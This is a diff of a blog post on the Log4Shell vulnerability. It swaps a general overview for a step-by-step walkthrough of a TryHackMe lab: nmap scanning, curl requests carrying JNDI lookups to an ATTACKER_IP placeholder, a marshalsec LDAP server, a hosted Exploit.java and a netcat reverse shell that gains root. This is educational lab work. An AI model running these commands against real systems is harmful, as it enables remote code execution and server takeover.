@@ -3,79 +3,125 @@ import styles from './document.module.css'
 
 <div>
 
-## Introduction
+## What's Going On?
 
-If you're into cybersecurity even a little bit, you probably have heard about
-the recent, groundbreaking exploit: **Log4Shell**. The threat is considered
-catastrophic by the cybersecurity community because of the vast number of devices that use the library.
-Before we understand the exploit and why we should be worried, let's first understand 
-the **Log4j** library. 
-
-*I suggest reading the overview if you continue to the technical 
-explanation.*
-
-## Overview
-
-**Log4j** is a tool to help developers monitor and debug software in order
-to ensure everything runs smoothly. It logs a ton of information and the main
-purpose is to store the information somewhere like a server. The purpose of this
-library should be to *just* store information, but what if we can trick the server
- to execute code?
-
-The vulnerability within Log4j is known as **Log4shell**. To better understand this vulnerability, let's discuss how it was discovered. Minecraft
-uses Log4j for debugging and essentially logs the events as the 
-application is running. If the game were to crash, Log4j would be able to see 
-when and what process may have caused it. It can also keep track of the messages sent by
-the players which is logged to the server (see where the vulnerability can be?).
-
-An injection attack is a type of attack where the attacker inputs a message followed by
-a command that injects a malicious program into the server.
-By utilizing an injection attack which is just tricking the server to execute code from the
-attacker, malicious code can be executed on the server which can grant the attacker
-unauthorized access and more. The attacker can have access to sensitive information on the server
-as well as even admin privileges to do as they please.
+A new exploit has just been discovered that has been causing an uproar in the
+cyber security community (as well as most companies). CVE-2021-44228, or **Log4Shell**,
+is an exploit that takes advantage of a vulnerability in the Log4j library by
+allowing the ability of remote code execution from unauthorized users.
 
 
-## How It Works
-Now for the more in-depth discussion. **Log4j** is a popular monitoring framework written in Java and is used to log 
-data. I think the non-technical explanation pretty much covers it, so I'll jump right 
-into the vulnerability.
+## Overview of Log4j
 
-Going back to the Minecraft example, Log4j works with the Java Naming and
-Directory Interface (JNDI) API which allows developers to connect their programs with
-external directories. Lightweight Directory Access Protocol (LDAP) is the tool used to essentially connect
-everything which is used by JNDI. 
+Let's back up a bit and understand the library with the catastrophic vulnerability: **Log4j**.
+The Log4j library is a logging tool for Java that utilizes Java Naming and Director Interface (JDNI) and
+Lightweight Directory Access Protocol (LDAP) protocols. JNDI is the protocol that retrieves data
+from a remote server and LDAP is the protocol used for communication to a server such as a database.
 
-The following command can be pasted into the chat to perform the injection:
-`${jndi:ldap://ip_address/malicious_code()`. That's really it. A command sent through the
-chat can allow attackers to execute any code on the host's server.
+By using a JNDI lookup to the LDAP server, it was possible to return an object containing code that can be executed
+on the victim's server. That means something like a reverse shell can be performed to gain complete control over the
+server. That's it... a simple injection attack that was powerful enough to cause chaos and rated the one of the most dangerous
+vulnerabilities ever discovered.
 
-Over the past few weeks, hosts of popular Minecraft servers have been hacked through this exploit. Sensitive information
-and credentials were hijacked because it was possible to use this attack on the client. Although simple, this attack
-demonstrates why companies and software that use Log4j have been causing an uproar.
+## TryHackMe Demo
 
-Be sure to check the references for the video that demonstrates
-the attack. John Hammond also does a really in-depth video with the exploit on both Minecraft and a TryHackMe Lab 
-which are both at the bottom as well.
+To get an idea of how easy this exploit is to perform, we can look at a lab that demonstrates the
+attack. I follow along John Hammond's TryHackMe room and encourage everyone to try it out themselves,
+but I'll still go through it if you're feeling lazy.
 
-## What Now?
+### Reconnaissance
 
-The patch is out, but Log4j is used by a *ton* of companies around the world which is 
-why this exploit is so critical. It's up to the teams in charge of the
-technology to update the version in order to avoid falling victim to this attack. It 
-was fortunate that such a vulnerability was discovered because an exploit like this
-is surely to be maliciously used by organizations and governments.
+After reading the introduction, we go into reconnaissance which is a fancy word for gathering information.
+To begin, we must understand what ports are open on this machine by using **nmap**. We are looking for a service running
+on port 8983 which can be found using the following command:
 
-As a matter of fact, the Chinese government actually dicisplined a group 
-for not reporting Log4shell to them first. The cybersecurity engineer to report the flaw
-was suspended of work for six months. As always, be sure to check the references for the full
-report.
+```
+$ nmap -sV -p8983 [MACHINE_IP]
+```
 
+### Discovery
+
+This section wants us to explore the url and log files that have been given to us, so let's take a
+look. When clicking on the link, we open a very minimal web interface that clearly shows log4j is used.
+The first question asks for the argument that -Dsolr.log.dir is set to which is seen on the front
+page as **/var/solr/logs**.
+
+The next three questions involve us looking at the task files which are logs. Download the given files
+and we quickly see one file has a significantly higher number of INFO entries than the
+others: **solr.log**. Among these requests, we see a path to **/admin/cores** and **params**={} which can
+be an entrypoint where a user could control.
+
+### Proof of Concept
+
+There's a great explanation in this section of the syntax and where the vulnerability can be exploited.
+By performing a JNDI lookup with external resources (i.e. untrusted data), the LDAP server retrieves
+the lookup and allows the attacker to execute remote code.
+
+Afterwards, the tasks want us to test for vulnerabilities in the system. Use either of
+the following commands to view our own attacking machine IP address.
+```
+$ ip addr show
+```
+```
+$ ifconfig
+```
+For those unfamiliar with interface configuration (ifconfig), we just need to check
+our VPN interface which is labeled tun0. The specific address we need is inet which
+will be needed to make our request later (ATTACKER_IP).
+
+Now prepare our netcat listener on port 9999 with the following command:
+```
+$ nc -lnvp 9999
+```
+In a separate terminal, we can make a request with curl with the following command (replace
+the necessary parts being the machine IP and attacker IP):
+```
+$ curl 'http://(MACHINE_IP):8983/solr/admin/cores?foo=$\{jndi:ldap://(ATTACKER_IP):9999\}'
+```
+Netcat should catch the connection and produce some weird symbols. We have verified a connection and
+can move onto the next section.
+
+### Exploitation
+
+The part we've all been waiting for... the exploit itself. This section begins by explaining
+how the JNDI and LDAP protocols work together to retrieve a lookup resource. An HTTP server will
+host our malicious file where the LDAP server will retrieve and execute (which can easily be set up using
+python3). This part can get a little messy, so I've organized steps into what we need to do.
+
+1. We will need Java 8 installed (specifically 1.8.0_181) which is relatively straightforward in the
+description. Verify with `java -version`.
+2. `git clone https://github.com/mbechler/marshalsec`
+3. `sudo apt install maven`
+4. ~/marshalsec $ `mvn clean package -DskipTests`
+5. Copy and paste the Java exploit code and name it Exploit.java. Compile with `javac Exploit.java`
+
+We have finished the prerequisites and can begin the exploit. I used 4 terminals for
+the HTTP server, our netcat listener, LDAP server startup (marshalsec), and curl command to trigger the
+exploit. Here are the steps I took:
+
+1. Start LDAP server: ~/marshalsec
+$ `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://(ATTACKER_IP):8000/#Exploit"`
+2. Start the HTTP server with `python3 -m http.server` and make sure we're in the same directory with `Exploit.*`
+3. Prepare a netcat listener to catch the reverse shell with `nc -lnvp 9999`
+4. Finally, execute `curl 'http://10.10.183.116:8983/solr/admin/cores?foo=$\{jndi:ldap://(ATTACKER_IP):1389/Exploit\}'`
+
+Type "whoami" in the netcat listener and we see that we have root access to the machine now.
+All we did was trick the LDAP server to request a JNDI lookup to retrieve our malicious code which made me understand
+how dangerously easy this exploit can be executed. 
+
+## Conclusion
+
+**Log4Shell** caused so much havoc not only due to its abundant presence across many companies,
+but how easily an adversary can utilize such an attack. A list of some of the
+more popular companies can be found <a href="https://github.com/YfryTchsGD/Log4jAttackSurface">here</a>.
+The vulnerability was found in Minecraft that demonstrates the attack very well, so be sure to check out those videos.
+There was also an interesting article discussing how workers were punished for not reporting the vulnerability to their
+government first that you should check out. These links can be found down below in the references.
 
 ## References
 
-* <a href="https://www.youtube.com/watch?v=aJteDOavUFk"> Minecraft Log4Shell Exploit </a>
 * <a href="https://tryhackme.com/room/solar"> John Hammond's TryHackMe Lab </a>
+* <a href="https://www.youtube.com/watch?v=aJteDOavUFk"> Minecraft Log4Shell Exploit </a>
 * <a href="https://www.youtube.com/watch?v=7qoPDq41xhQ"> John Hammond's Minecraft Video </a>
 * <a href="https://www.scmp.com/tech/big-tech/article/3160670/apache-Log4j-bug-chinas-industry-ministry-pulls-support-alibaba-cloud"> Apache Log4j bug: China’s industry ministry pulls support from Alibaba Cloud for not reporting flaw to government first  </a>
 
